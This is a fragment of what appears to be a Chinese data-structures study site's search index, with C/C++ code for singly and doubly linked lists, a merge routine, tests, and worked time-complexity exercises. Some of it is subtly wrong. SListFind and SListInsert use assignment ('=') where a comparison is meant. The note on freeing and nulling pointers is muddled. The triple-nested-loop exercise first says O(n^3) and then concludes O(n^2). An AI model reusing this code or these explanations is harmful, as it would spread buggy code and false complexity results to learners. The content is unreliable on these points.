p-&gt;data);\n        std::cout &lt;&lt; \"\u7b2c\" &lt;&lt; index + 1 &lt;&lt; \"\u4f4d\u5143\u7d20\u662f\uff1a\" &lt;&lt; p-&gt;data &lt;&lt; std::endl;\n    }\n    else {\n        printf(\"\u672a\u67e5\u8be2\u5230\u7b2c%d\u4f4d\u5143\u7d20\\n\", index);\n    }\n}\n\n\n// \u68c0\u67e5\u662f\u5426\u4e3a\u201c\u975e\u964d\u5e8f\u201d,\nbool isNotDecreasing(LinkList list) {\n    if (list == NULL || list-&gt;next == NULL) {\n        return true;  // \u7a7a\u94fe\u8868\u6216\u53ea\u6709\u4e00\u4e2a\u8282\u70b9\u7684\u94fe\u8868\u89c6\u4e3a\u975e\u964d\u5e8f\n    }\n\n    LinkList cur = list;\n    while (cur-&gt;next != NULL) {\n        if (cur-&gt;data &gt; cur-&gt;next-&gt;data) {\n            return false;  // \u51fa\u73b0\u964d\u5e8f\uff0c\u8fd4\u56defalse\n        }\n        cur = cur-&gt;next;\n    }\n\n    return true;  // \u904d\u5386\u5b8c\u94fe\u8868\u6ca1\u6709\u51fa\u73b0\u964d\u5e8f\uff0c\u8fd4\u56detrue\n}\n\n\n// \u5408\u5e76\u4e24\u4e2a\u94fe\u8868\nLinkList Combine(LinkList La, LinkList Lb) {\n    if (La == NULL) {\n        return Lb;\n    }\n    if (Lb == NULL) {\n        return La;\n    }\n\n    LinkList head = NULL;\n    LinkList tail = NULL;\n\n    LinkList curA = La;\n    LinkList curB = Lb;\n\n    if (curA-&gt;data &lt;= curB-&gt;data) {\n        head = tail = curA;\n        curA = curA-&gt;next;\n    }\n    else {\n        head = tail = curB;\n        curB = curB-&gt;next;\n    }\n\n    while (curA != NULL &amp;&amp; curB != NULL) {\n        if (curA-&gt;data &lt;= curB-&gt;data) {\n            tail-&gt;next = curA;\n            curA = curA-&gt;next;\n        }\n        else {\n            tail-&gt;next = curB;\n            curB = curB-&gt;next;\n        }\n        tail = tail-&gt;next;\n    }\n\n    // \u5c06\u5269\u4f59\u672a\u904d\u5386\u5b8c\u7684\u94fe\u8868\u8fde\u63a5\u5230\u7ed3\u679c\u94fe\u8868\u7684\u672b\u5c3e\n    if (curA != NULL) {\n        tail-&gt;next = curA;\n    }\n    else if (curB != NULL) {\n        tail-&gt;next = curB;\n    }\n\n    return head;\n}\n\n\n// \u6e05\u7a7a\u5355\u94fe\u8868\nvoid ClearSList(LinkList* phead) {\n    *phead = NULL;\n    count = 0;\n}\n\n\n// \u9500\u6bc1\u5355\u94fe\u8868\nvoid DestroyList(LinkList* phead) {\n    LinkList cur = *phead;\n    while (cur != NULL) {\n        LinkList next = cur-&gt;next;\n        free(cur);\n        cur = next;\n    }\n    *phead = NULL;\n}\n\n\nvoid Menu() {\n    printf(\"\\n***********************************************\\n\");\n    printf(\"************** \u5b66\u751f\u6210\u7ee9\u7ba1\u7406\u7cfb\u7edf ***************\\n\");\n    printf(\"**                                           **\\n\");\n    printf(\"**         \\033[1;36;41m\u5f53\u524d\u7cfb\u7edf\u4e2d\u6709 %d \u4efd\u6570\u636e\uff01\\033[m           **\\n\", count);\n    printf(\"**                                           **\\n\");\n    printf(\"**       1: SListPushBack  \u5c3e\u63d2\u6570\u636e          **\\n\");\n    printf(\"**       2: SListPushFront \u5934\u63d2\u6570\u636e          **\\n\");\n    printf(\"**       3: SListPopBack   \u5c3e\u5220\u6570\u636e          **\\n\");\n    printf(\"**       4: SListPopFront  \u5934\u5220\u6570\u636e          **\\n\");\n    printf(\"**       5: SListPrint     \u6253\u5370\u5355\u94fe\u8868        **\\n\");\n    printf(\"**       6: ListInsert     \u63d2\u5165\u6570\u636e          **\\n\");\n    printf(\"**       7: FindFromElem   \u7531\u6570\u636e\u67e5\u627e        **\\n\");\n    printf(\"**       8: FindFromIndex  \u7531\u7d22\u5f15\u503c\u67e5\u627e      **\\n\");\n    printf(\"**       9: SListErase     \u5220\u9664\u8282\u70b9          **\\n\");\n    printf(\"**      10: Combine        \u5408\u5e76\u4e24\u4e2a\u5355\u94fe\u8868    **\\n\");\n    printf(\"**      11: ClearSList     \u6e05\u7a7a\u5355\u94fe\u8868        **\\n\");\n    printf(\"**      12: destroyList    \u9500\u6bc1\u5355\u94fe\u8868(\u9000\u51fa)  **\\n\");\n    printf(\"**                                           **\\n\");\n    printf(\"***********************************************\\n\\n\");\n}\n\n\nint main() {\n\n    LinkList list = NULL;\n    int function = 0;\n\n    Menu();\n    while (1) {\n        printf(\"\u8bf7\u9009\u62e9\u4f60\u7684\u64cd\u4f5c\uff1a\");\n        scanf(\"%d\", &amp;function);\n\n        switch (function) {\n        case 1: {\n            ElemType i = 0;\n            printf(\"\u8bf7\u51fa\u5165\u8981\u63d2\u5165\u7684\u6570\u636e\uff1a\");\n            //scanf(\"%d\", &amp;i);\n            std::cin &gt;&gt; i;\n\n            SListPushBack(&amp;list, i);\n            SListPrint(list);\n\n            printf(\"-------------------------------------------\\n\\n\\n\");\n            Menu();\n            break;\n        }\n\n        case 2: {\n            ElemType i = 0;\n            printf(\"\u8bf7\u51fa\u5165\u8981\u63d2\u5165\u7684\u6570\u636e\uff1a\");\n            //scanf(\"%d\", &amp;i);\n            std::cin &gt;&gt; i;\n\n            SListPushFront(&amp;list, i);\n            SListPrint(list);\n\n            printf(\"-------------------------------------------\\n\\n\\n\");\n            Menu();\n            break;\n        }\n\n        case 3: {\n            SListPopBack(&amp;list);\n            SListPrint(list);\n\n            printf(\"-------------------------------------------\\n\\n\\n\");\n            Menu();\n            break;\n        }\n\n        case 4: {\n            SListPopFront(&amp;list);\n            SListPrint(list);\n\n            printf(\"-------------------------------------------\\n\\n\\n\");\n            Menu();\n            break;\n        }\n\n        case 5: {\n            printf(\"\u5355\u94fe\u8868\u5982\u4e0b\uff1a\\n\");\n            SListPrint(list);\n            printf(\"-------------------------------------------\\n\\n\\n\");\n            Menu();\n            break;\n        }\n\n        case 6: {\n            ElemType num;\n            int index;\n            printf(\"\u8bf7\u8f93\u5165\u8981\u63d2\u5165\u7684\u7d22\u5f15\u503c (\u6570\u636e\u5c06\u63d2\u5165\u5230\u7d22\u5f15\u503c\u7684\u524d\u4e00\u4f4d\uff01\uff01)\uff1a\");\n            scanf(\"%d\", &amp;index);\n\n            printf(\"\u8bf7\u8f93\u5165\u8981\u63d2\u5165\u7684\u6570\u636e\uff1a\");\n            //scanf(\"%d\", &amp;i);\n            std::cin &gt;&gt; num;\n\n            SListInsert(&amp;list, index, num);\n            printf(\"\u63d2\u5165\u6210\u529f\uff01\\n\");\n            SListPrint(list);\n\n            printf(\"-------------------------------------------\\n\\n\\n\");\n            Menu();\n            break;\n        }\n\n        case 7: {\n            if (count) {\n                int index;\n\n                ElemType num;\n                printf(\"\u8bf7\u8f93\u5165\u8981\u67e5\u627e\u7684\u6570\u636e\uff1a\");\n                //scanf(\"%d\", &amp;num);\n                std::cin &gt;&gt; num;\n\n                index = SListFind(list, num);\n\n                if (index &gt; 0) {\n                    printf(\"\u6240\u67e5\u627e\u7684\u6570\u636e\u5bf9\u5e94\u7684\u5bf9\u5e94\u7d22\u5f15\u503c\u4e3a\uff1a%d\\n\", index + 1);\n                }\n                else {\n                    printf(\"\u5f53\u524d\u94fe\u8868\u4e2d\u65e0\u6b64\u6570\u636e\uff01\\n\");\n                }\n            }\n            else {\n                printf(\"\u5f53\u524d\u94fe\u8868\u65e0\u6570\u636e\uff0c\u8bf7\u5148\u63d2\u5165\u6570\u636e\uff01\\n\");\n            }\n\n            printf(\"-------------------------------------------\\n\\n\\n\");\n            Menu();\n            break;\n        }\n\n        case 8: {\n            if (count) {\n                int index;\n                printf(\"\u8bf7\u8f93\u5165\u8981\u67e5\u627e\u7684\u7d22\u5f15\u503c\uff1a\");\n                scanf(\"%d\", &amp;index);\n                FindFromIndex(list, index);\n            }\n            else {\n                printf(\"\u5f53\u524d\u94fe\u8868\u65e0\u6570\u636e\uff0c\u8bf7\u5148\u63d2\u5165\u6570\u636e\uff01\\n\");\n            }\n\n            printf(\"-------------------------------------------\\n\\n\\n\");\n            Menu();\n            break;\n        }\n\n        case 9: {\n            if (count) {\n                int index = NULL;\n                printf(\"\u8bf7\u8f93\u5165\u4f60\u8981\u5220\u9664\u5143\u7d20\u7684\u7d22\u5f15\u503c:\");\n                scanf(\"%d\", &amp;index);\n                SListErase(&amp;list, index);\n                printf(\"\u5220\u9664\u6210\u529f\uff01\\n\");\n                SListPrint(list);\n            }\n            else {\n                printf(\"\u5f53\u524d\u94fe\u8868\u65e0\u6570\u636e\uff0c\u8bf7\u5148\u63d2\u5165\u6570\u636e\uff01\\n\");\n            }\n\n            printf(\"-------------------------------------------\\n\\n\\n\");\n            Menu();\n            break;\n        }\n\n        case 10: {\n            /* \n            \u4e24\u4e2a\u7ebf\u6027\u8868\u5408\u5e76\u7b97\u6cd5\u7684\u5b9e\u73b0\u3002\n            \u5df2\u77e5\u987a\u5e8f\u8868LA\u548cLB\u4e2d\u7684\u6570\u636e\u5143\u7d20\u6309\u503c\u975e\u9012\u51cf\u6709\u5e8f\u6392\u5217\n            \u73b0\u8981\u5c06LA\u548cLB\u5f52\u5e76\u4e3a\u4e00\u4e2a\u65b0\u7684\u987a\u5e8f\u8868LC\n            \u4e14LC\u4e2d\u7684\u6570\u636e\u5143\u7d20\u4ecd\u6309\u503c\u975e\u9012\u51cf\u6709\u5e8f\u6392\u5e8f\u3002\n            \u4f8b\u5982\uff1aLA\uff1d\uff083,5,8,11\uff09  LB\uff1d\uff082,6,9,15,20\uff09\u3002\n            */\n\n            LinkList La = list;\n\n            LinkList Lb = NULL;  // \u521d\u59cb\u5316\u4e3a\u7a7a\u94fe\u8868\n            LinkList pB = NULL;  \n\n            // \u68c0\u67e5A\u662f\u5426\u5408\u6cd5\n            if (!isNotDecreasing(La)) {\n                printf(\"\\n\u5f53\u524d\u94fe\u8868\u5e76\u975e\\\"\u975e\u9012\u51cf\u6709\u5e8f\u6392\u5217\\\"\uff01\\n\\n\");\n                break;\n            }\n\n            // \u521d\u59cb\u5316\u5355\u94fe\u8868 Lb\n            printf(\"\u8bf7\u8f93\u5165\u94fe\u8868 B \u7684\u5143\u7d20\uff08\u8f93\u5165 -1 \u7ed3\u675f\uff09:\\n\");\n            ElemType temp;\n            std::cin &gt;&gt; temp;\n\n            int countTemp = 0;\n\n            while (temp != -1) {\n                LinkList newnode = (LNode*)malloc(sizeof(LNode));\n                newnode-&gt;data = temp;\n                newnode-&gt;next = NULL;\n\n                if (Lb == NULL) {\n                    Lb = newnode;\n                    pB = Lb; // \u6307\u5411\u94fe\u8868 Lb \u7684\u5c3e\u8282\u70b9\n                }\n                else {\n                    pB-&gt;next = newnode;\n                    pB = pB-&gt;next;\n                }\n\n                std::cin &gt;&gt; temp;\n                countTemp++;\n            }\n\n            printf(\"B\u4e2d\u5143\u7d20\u4e3a\uff1a\");\n            SListPrint(Lb);\n            printf(\"\\n\");\n\n            // \u68c0\u67e5B\u662f\u5426\u5408\u6cd5\n            if (!isNotDecreasing(Lb)) {\n                printf(\"\\nLb \u5e76\u975e\\\"\u975e\u9012\u51cf\u6709\u5e8f\u6392\u5217\\\"\uff01\\n\\n\");\n                break;\n            }\n\n            // \u5408\u5e76\u5355\u94fe\u8868 La \u548c Lb \u81f3 Lc\n            LinkList Lc = Combine(La, Lb);\n\n            count += countTemp;\n\n            // \u6253\u5370\u5408\u5e76\u540e\u7684\u94fe\u8868 Lc\n            printf(\"\u5408\u5e76\u540e\u7684\u94fe\u8868\u4e3a: \\n\");\n            SListPrint(Lc);\n\n            printf(\"-------------------------------------------\\n\\n\\n\");\n            Menu();\n\n            break;\n        }\n\n        case 11: {\n            ClearSList(&amp;list);\n            printf(\"\u6e05\u7a7a\u6210\u529f\uff01\\n\");\n            SListPrint(list);\n\n            printf(\"-------------------------------------------\\n\\n\\n\");\n            Menu();\n            break;\n        }\n\n        case 12: {\n            DestroyList(&amp;list);\n            exit(0);\n        }\n\n        default:\n            printf(\"\u8f93\u5165\u6709\u8bef\uff0c\u8bf7\u91cd\u65b0\u8f93\u5165\\a\\n\");\n            break;\n        }\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/%E5%8D%95%E9%93%BE%E8%A1%A8/","title":"\u5355\u94fe\u8868","text":"<p>\u7b80\u5355\u5b9e\u73b0\u4e00\u4e0b\u5355\u94fe\u8868</p>"},{"location":"DEC/Data-Structure/%E5%8D%95%E9%93%BE%E8%A1%A8/#slisth","title":"SList.h","text":"C<pre><code>#pragma once\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\ntypedef int SLTDataType;\n\ntypedef struct SListNode {\n    SLTDataType data;\n    struct SListNode* next;\n}SLTNode;\n\nvoid SListPrint(SLTNode* phead);\n\n// \u56db\u5927\u64cd\u4f5c\nvoid SListPushBack(SLTNode** pphead, SLTDataType x);\nvoid SListPushFront(SLTNode** pphead, SLTDataType x);\nvoid SListPopFront(SLTNode** pphead);\nvoid SListPopBack(SLTNode** pphead);\n\nSLTNode* SListFind(SLTNode* phead, SLTDataType x);\n\n// \u5728pos\u7684\u524d\u9762\u63d2\u5165x\nvoid SListInsert(SLTNode** phead, SLTNode* pos, SLTDataType x);\n\n// \u5220\u9664pos\u4f4d\u7f6e\u7684\u503c\nvoid SListErase(SLTNode** phead, SLTNode* pos);\n</code></pre>"},{"location":"DEC/Data-Structure/%E5%8D%95%E9%93%BE%E8%A1%A8/#slistc","title":"SList.c","text":"C<pre><code>#include \"SList.h\"\n\nvoid SListPrint(SLTNode* phead) {\n    SLTNode* cur = phead;\n    while (cur != NULL) {\n        printf(\"%d-&gt;\", cur-&gt;data);\n        cur = cur-&gt;next;\n    }\n    printf(\"NULL\");\n}\n\nSLTNode* BuySListNode(SLTDataType x) {\n    SLTNode* newnode = (SLTNode*)malloc(sizeof(SLTNode));\n    newnode-&gt;data = x;\n    newnode-&gt;next = NULL;\n\n    return newnode;\n}\n\nvoid SListPushBack(SLTNode** pphead, SLTDataType x) {\n    SLTNode* newnode = BuySListNode(x);\n\n    if (*pphead == NULL) {\n        *pphead = newnode;\n    }\n    else {\n        SLTNode* tail = *pphead;\n        while (tail-&gt;next != NULL) {\n            tail = tail-&gt;next;\n        }\n\n        tail-&gt;next = newnode;\n    }\n}\n\nvoid SListPushFront(SLTNode** pphead, SLTDataType x) {\n    SLTNode* newnode = BuySListNode(x);\n\n    newnode-&gt;next = *pphead;\n    *pphead = newnode;\n}\n\nvoid SListPopFront(SLTNode** pphead) {\n    SLTNode* next = (*pphead)-&gt;next;\n    free(*pphead);\n\n    *pphead = next;\n}\n\nvoid SListPopBack(SLTNode** pphead) {\n    // 1\u3001\u7a7a\n    // 2\u3001\u4e00\u4e2a\u8282\u70b9\n    // 3\u3001\u4e00\u4e2a\u4ee5\u4e0a\u7684\u8282\u70b9\n\n    if ((*pphead) == NULL) {\n        return;\n    }\n    else if ((*pphead)-&gt;next == NULL) {\n        free(*pphead);\n        *pphead = NULL;\n    }\n    else {\n        SLTNode* prev = NULL;\n        SLTNode* tail = *pphead;\n\n        while (tail-&gt;next != NULL) {\n            prev = tail;\n            tail = tail-&gt;next;\n        }\n\n        free(tail);\n        prev-&gt;next = NULL;\n    }\n}\n\nSLTNode* SListFind(SLTNode* phead, SLTDataType x) {\n    SListNode* cur = phead;\n    while (cur != NULL) {\n        if (cur-&gt;data = x) {\n            return cur;\n        }\n\n        cur = cur-&gt;next;\n    }\n\n    return NULL;\n}\n\nvoid SListInsert(SLTNode** pphead, SLTNode* pos, SLTDataType x) {\n    if (pos = *pphead) {\n        SListPushFront(pphead, x);\n    }\n    else {\n        SLTNode* newnode = BuySListNode(x);\n        SLTNode* prev = *pphead;\n        while (prev-&gt;next != pos) {\n            prev = prev-&gt;next;\n        }\n\n        prev-&gt;next = newnode;\n        newnode-&gt;next = pos;\n    }\n}\n\nvoid SListErase(SLTNode** pphead, SLTNode* pos) {\n    if (pos == *pphead) {\n        SListPopFront(pphead);\n    }\n    else {\n        SLTNode* prev = *pphead;\n        while (prev-&gt;next != pos) {\n            prev = prev-&gt;next;\n        }\n\n        prev-&gt;next = pos-&gt;next;\n        free(pos);\n    }\n}\n</code></pre> <p>\u5728\u8fd9\u4e2a\u51fd\u6570\u4e2d\uff0c\u5148\u91ca\u653e\u8282\u70b9\uff0c\u7136\u540e\u5c06\u6307\u9488\u7f6e\u7a7a\u7684\u539f\u56e0\u662f\u4e3a\u4e86\u9632\u6b62\u5185\u5b58\u6cc4\u6f0f\u548c\u907f\u514d\u60ac\u6302\u6307\u9488\uff08dangling pointers\uff09\u95ee\u9898\u3002</p> <p>\u8003\u8651\u4ee5\u4e0b\u60c5\u51b5\uff1a</p> <ol> <li> <p>\u76f4\u63a5\u5c06\u6307\u9488\u7f6e\u7a7a\uff1a    C<pre><code>*pphead = NULL;\n</code></pre>    \u5982\u679c\u5148\u5c06\u6307\u9488\u7f6e\u7a7a\uff0c\u7136\u540e\u518d\u91ca\u653e\u5185\u5b58\uff0c\u90a3\u4e48\u65e0\u6cd5\u518d\u8bbf\u95ee\u8fd9\u4e2a\u5185\u5b58\u5730\u5740\uff0c\u4e5f\u5c31\u65e0\u6cd5\u91ca\u653e\u5b83\uff0c\u4ece\u800c\u5bfc\u81f4\u5185\u5b58\u6cc4\u6f0f\u3002</p> </li> <li> <p>\u5148\u91ca\u653e\u5185\u5b58\uff0c\u7136\u540e\u7f6e\u7a7a\u6307\u9488\uff1a    C<pre><code>free(tail);\nprev-&gt;next = NULL;\n</code></pre>    \u8fd9\u79cd\u65b9\u5f0f\u5148\u91ca\u653e\u4e86\u5185\u5b58\uff0c\u786e\u4fdd\u6ca1\u6709\u5185\u5b58\u6cc4\u6f0f\u3002\u7136\u540e\u518d\u5c06\u6307\u9488\u7f6e\u7a7a\uff0c\u8fd9\u6837\u53ef\u4ee5\u907f\u514d\u60ac\u6302\u6307\u9488\u95ee\u9898\u3002\u5982\u679c\u5148\u5c06\u6307\u9488\u7f6e\u7a7a\uff0c\u518d\u91ca\u653e\u5185\u5b58\uff0c\u90a3\u4e48prev\u6307\u9488\u4ecd\u7136\u6307\u5411\u5df2\u7ecf\u91ca\u653e\u7684\u5185\u5b58\u5730\u5740\uff0c\u8fd9\u4f1a\u5bfc\u81f4\u60ac\u6302\u6307\u9488\u95ee\u9898\u3002</p> </li> </ol>"},{"location":"DEC/Data-Structure/%E5%8D%95%E9%93%BE%E8%A1%A8/#testc","title":"Test.c","text":"C<pre><code>#include \"SList.h\"\n\nvoid TestSList1()\n{\n    SLTNode* plist = NULL;\n    SListPushBack(&amp;plist, 1);\n    SListPushBack(&amp;plist, 2);\n    SListPushBack(&amp;plist, 3);\n    SListPushBack(&amp;plist, 4);\n    SListPushFront(&amp;plist, 0);\n    SListPrint(plist);\n\n    SListPopFront(&amp;plist);\n    SListPopFront(&amp;plist);\n    SListPopFront(&amp;plist);\n    SListPrint(plist);\n\n    SListPopFront(&amp;plist);\n    SListPopFront(&amp;plist);\n    SListPrint(plist);\n}\n\nvoid TestSList2()\n{\n    SLTNode* plist = NULL;\n    SListPushBack(&amp;plist, 1);\n    SListPushBack(&amp;plist, 2);\n    SListPushBack(&amp;plist, 3);\n    SListPushBack(&amp;plist, 4);\n    SListPrint(plist);\n\n    SListPopBack(&amp;plist);\n    SListPopBack(&amp;plist);\n    SListPopBack(&amp;plist);\n    SListPopBack(&amp;plist);\n    SListPopBack(&amp;plist);\n    SListPrint(plist);\n}\n\nvoid TestSList3()\n{\n    SLTNode* plist = NULL;\n    SListPushBack(&amp;plist, 1);\n    SListPushBack(&amp;plist, 2);\n    SListPushBack(&amp;plist, 3);\n    SListPushBack(&amp;plist, 4);\n    SListPrint(plist);\n\n    // \u60f3\u57283\u7684\u524d\u9762\u63d2\u5165\u4e00\u4e2a30\n    SLTNode* pos = SListFind(plist, 1);\n    if (pos)\n    {\n        SListInsert(&amp;plist, pos, 10);\n    }\n    SListPrint(plist);\n\n    pos = SListFind(plist, 3);\n    if (pos)\n    {\n        SListInsert(&amp;plist, pos, 30);\n    }\n    SListPrint(plist);\n}\n\nvoid TestSList4()\n{\n    SLTNode* plist = NULL;\n    SListPushBack(&amp;plist, 1);\n    SListPushBack(&amp;plist, 2);\n    SListPushBack(&amp;plist, 3);\n    SListPushBack(&amp;plist, 4);\n    SListPrint(plist);\n\n    SLTNode* pos = SListFind(plist, 1);\n    if (pos)\n    {\n        SListErase(&amp;plist, pos);\n    }\n    SListPrint(plist);\n\n    pos = SListFind(plist, 4);\n    if (pos)\n    {\n        SListErase(&amp;plist, pos);\n    }\n    SListPrint(plist);\n\n    pos = SListFind(plist, 3);\n    if (pos)\n    {\n        SListErase(&amp;plist, pos);\n    }\n    SListPrint(plist);\n\n    pos = SListFind(plist, 2);\n    if (pos)\n    {\n        SListErase(&amp;plist, pos);\n    }\n    SListPrint(plist);\n}\n\n\nint main()\n{\n    TestSList1();\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/%E5%8F%8C%E5%90%91%E9%93%BE%E8%A1%A8/","title":"\u53cc\u5411\u94fe\u8868","text":""},{"location":"DEC/Data-Structure/%E5%8F%8C%E5%90%91%E9%93%BE%E8%A1%A8/#listh","title":"List.h","text":"C<pre><code>#pragma once\n\n#include &lt;assert.h&gt;\n#include &lt;stdbool.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\ntypedef int LTDataType;\n\ntypedef struct ListNode\n{\n    struct ListNode* next;\n    struct ListNode* prev;\n    LTDataType data;\n}ListNode;\n\n\nListNode* ListInit();\nvoid ListDestory(ListNode* phead);\nvoid ListPrint(ListNode* phead);\n\nvoid ListPushBack(ListNode* phead, LTDataType x);\nvoid ListPushFront(ListNode* phead, LTDataType x);\nvoid ListPopFront(ListNode* phead);\nvoid ListPopBack(ListNode* phead);\n\nListNode* ListFind(ListNode* phead, LTDataType x);\n\n// pos\u4f4d\u7f6e\u4e4b\u524d\u63d2\u5165x\nvoid ListInsert(ListNode* pos, LTDataType x);\n\n// \u5220\u9664pos\u4f4d\u7f6e\u7684\u503c\nvoid ListErase(ListNode* pos);\n\nbool ListEmpty(ListNode* phead);\n\nint ListSize(ListNode* phead);\n</code></pre>"},{"location":"DEC/Data-Structure/%E5%8F%8C%E5%90%91%E9%93%BE%E8%A1%A8/#listc","title":"List.c","text":"C<pre><code>#include \"List.h\"\n\nListNode* BuyListNode(LTDataType x)\n{\n    ListNode* newnode = (ListNode*)malloc(sizeof(ListNode));\n    newnode-&gt;data = x;\n    newnode-&gt;next = NULL;\n    newnode-&gt;prev = NULL;\n\n    return newnode;\n}\n\n\nListNode* ListInit()\n{\n    ListNode* phead = BuyListNode(NULL);\n    phead-&gt;next = phead;\n    phead-&gt;prev = phead;\n\n    return phead;\n}\n\n\nvoid ListDestory(ListNode* phead)\n{\n    assert(phead);\n    ListNode* cur = phead-&gt;next;\n    while (cur != phead)\n    {\n        ListNode* next = cur-&gt;next;\n        free(cur);\n        cur = next;\n    }\n\n    free(phead);\n    phead = NULL;\n}\n\n\nvoid ListPrint(ListNode* phead)\n{\n    assert(phead);\n\n    ListNode* cur = phead-&gt;next;\n    while (cur != phead)\n    {\n        printf(\"%d \", cur-&gt;data);\n        cur = cur-&gt;next;\n    }\n    printf(\"\\n\");\n}\n\n\nvoid ListPushBack(ListNode* phead, LTDataType x)\n{\n    assert(phead);\n\n    //ListNode* tail = phead-&gt;prev;\n    //ListNode* newnode = BuyListNode(x);\n\n    //tail-&gt;next = newnode;\n    //newnode-&gt;prev = tail;\n    //newnode-&gt;next = phead;\n    //phead-&gt;prev = newnode;\n\n    ListInsert(phead, x);\n}\n\n\nvoid ListPushFront(ListNode* phead, LTDataType x)\n{\n    assert(phead);\n\n    //ListNode* newnode = BuyListNode(x);\n    //newnode-&gt;next = phead-&gt;next;\n    //phead-&gt;next-&gt;prev = newnode;\n\n    //phead-&gt;next = newnode;\n    //newnode-&gt;prev = phead;\n\n    ListInsert(phead-&gt;next, x);\n}\n\n\nvoid ListPopFront(ListNode* phead)\n{\n    assert(phead);\n    //assert(phead-&gt;next != phead);\n\n    //ListNode* first = phead-&gt;next;\n    //ListNode* second = first-&gt;next;\n    //phead-&gt;next = second;\n    //second-&gt;prev = phead;\n\n    //free(first);\n    //first = NULL;\n\n    ListErase(phead-&gt;next);\n}\n\n\nvoid ListPopBack(ListNode* phead)\n{\n    assert(phead);\n    /*assert(phead-&gt;next != phead);\n\n    ListNode* tail = phead-&gt;prev;\n    ListNode* prev = tail-&gt;prev;\n\n    prev-&gt;next = phead;\n    phead-&gt;prev = prev;\n\n    free(tail);\n    tail = NULL;*/\n\n    ListErase(phead-&gt;prev);\n}\n\n\nListNode* ListFind(ListNode* phead, LTDataType x)\n{\n    assert(phead);\n    ListNode* cur = phead-&gt;next;\n    while (cur != phead)\n    {\n        if (cur-&gt;data == x)\n        {\n            return cur;\n        }\n\n        cur = cur-&gt;next;\n    }\n\n    return NULL;\n}\n\n\n// pos\u4f4d\u7f6e\u4e4b\u524d\u63d2\u5165x\nvoid ListInsert(ListNode* pos, LTDataType x)\n{\n    assert(pos);\n    ListNode* prev = pos-&gt;prev;\n    ListNode* newnode = BuyListNode(x);\n\n    prev-&gt;next = newnode;\n    newnode-&gt;prev = prev;\n    newnode-&gt;next = pos;\n    pos-&gt;prev = newnode;\n}\n\n\n// \u5220\u9664pos\u4f4d\u7f6e\u7684\u503c\nvoid ListErase(ListNode* pos)\n{\n    assert(pos);\n\n    ListNode* prev = pos-&gt;prev;\n    ListNode* next = pos-&gt;next;\n    prev-&gt;next = next;\n    next-&gt;prev = prev;\n    free(pos);\n}\n</code></pre>"},{"location":"DEC/Data-Structure/%E5%8F%8C%E5%90%91%E9%93%BE%E8%A1%A8/#testc","title":"Test.c","text":"C<pre><code>#include \"List.h\"\n\nint main()\n{\n    ListNode* plist = ListInit();\n    ListPushBack(plist, 1);\n    ListPushBack(plist, 2);\n    ListPushBack(plist, 3);\n    ListPushBack(plist, 4);\n    ListPrint(plist);\n\n    ListPushFront(plist, 0);\n    ListPushFront(plist, -1);\n    ListPrint(plist);\n\n    ListPopFront(plist);\n    ListPopFront(plist);\n    ListPopFront(plist);\n    ListPrint(plist);\n\n    ListPopBack(plist);\n    ListPrint(plist);\n\n    ListDestory(plist);\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/%E5%A4%8D%E6%9D%82%E5%BA%A6/","title":"\u590d\u6742\u5ea6\u4f8b\u9898","text":""},{"location":"DEC/Data-Structure/%E5%A4%8D%E6%9D%82%E5%BA%A6/#_2","title":"\u65f6\u95f4\u590d\u6742\u5ea6\u4f8b\u9898","text":""},{"location":"DEC/Data-Structure/%E5%A4%8D%E6%9D%82%E5%BA%A6/#1","title":"1","text":"C<pre><code>// \u8ba1\u7b97BubbleSort\u7684\u65f6\u95f4\u590d\u6742\u5ea6\uff1f\nvoid BubbleSort(int* a, int n)\n{\n    assert(a);\n    for (int end = n; end &gt; 0; --end)\n    {\n        int exchange = 0;\n        for (int i = 1; i &lt; end; ++i)\n        {\n            if (a[i - 1] &gt; a[i])\n            {\n                Swap(&amp;a[i - 1], &amp;a[i]);\n                exchange = 1;\n            }\n        }\n        if (exchange == 0)\n            break;\n    }\n}\n</code></pre> <p>\u57fa\u672c\u64cd\u4f5c\u6267\u884c\u6700\u597dN\u6b21\uff0c\u6700\u574f\u6267\u884c\u4e86(N*(N+1)/2\u6b21\uff0c\u901a\u8fc7\u63a8\u5bfc\u5927O\u9636\u65b9\u6cd5+\u65f6\u95f4\u590d\u6742\u5ea6 \u4e00\u822c\u770b\u6700\u574f\uff0c\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a O(N^2)</p>"},{"location":"DEC/Data-Structure/%E5%A4%8D%E6%9D%82%E5%BA%A6/#2","title":"2","text":"C<pre><code>int main() {\n    int i, j, k;\n    int n;\n    int x;\n    for (i = 1; i &lt;= n; i++) {\n        for (j = 1; j &lt;= i; j++) {\n            for (k = 1; k &lt;= j; k++) {\n                x = x + 1;\n            }\n        }\n    }\n    printf(\"\\n%d\\n\", x);\n    return 0;\n}\n</code></pre> <p>\u8fd9\u6bb5\u51fd\u6570\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u662fO(n^3)\u3002</p> <p>\u8ba9\u6211\u4eec\u9010\u6b65\u5206\u6790\uff1a</p> <ol> <li> <p>\u5916\u5c42\u5faa\u73af\uff1a<code>for (i = 1; i &lt;= n; i++)</code>\uff0c\u5faa\u73af\u6b21\u6570\u4e3an\u6b21\u3002</p> </li> <li> <p>\u7b2c\u4e8c\u5c42\u5faa\u73af\uff1a<code>for (j = 1; j &lt;= i; j++)</code>\uff0c\u5faa\u73af\u6b21\u6570\u4ece1\u5230n\u4e0d\u7b49\uff0c\u5e73\u5747\u5faa\u73af\u6b21\u6570\u7ea6\u4e3an/2\u6b21\u3002</p> </li> <li> <p>\u7b2c\u4e09\u5c42\u5faa\u73af\uff1a<code>for (k = 1; k &lt;= j; k++)</code>\uff0c\u5faa\u73af\u6b21\u6570\u4ece1\u5230i\u4e0d\u7b49\uff0c\u5e73\u5747\u5faa\u73af\u6b21\u6570\u7ea6\u4e3ai/2\u6b21\u3002</p> </li> </ol> <p>\u56e0\u6b64\uff0c\u603b\u7684\u5faa\u73af\u6b21\u6570\u53ef\u4ee5\u8fd1\u4f3c\u4e3a\uff1a</p> <p><code>1 + 2 + 3 + ... + n/2 \u2248 (n/2)^2 = n^2/4</code></p> <p>\u6240\u4ee5\uff0c\u65f6\u95f4\u590d\u6742\u5ea6\u4e3aO(n^2/4) = O(n^2)\u3002</p> 